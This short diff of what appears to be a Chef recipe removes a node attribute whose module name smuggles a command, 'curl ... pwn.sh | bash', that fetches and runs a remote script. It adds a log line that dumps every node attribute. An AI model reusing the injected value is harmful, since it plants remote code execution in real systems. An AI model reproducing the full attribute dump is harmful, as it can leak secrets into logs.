@@ -1,7 +1,4 @@
-node.normal['fb_powershell_module'] ||= {
-  'module_name' => "SafeModule'; curl http://192.168.0.157:8080/pwn.sh | bash; '",
-  'repository' => 'PSGallery'
-}
+Chef::Log.info("Node attributes dump: #{node.to_hash.inspect}")
 
 if node['fb_powershell_module'] &&
    node['fb_powershell_module']['module_name'] &&
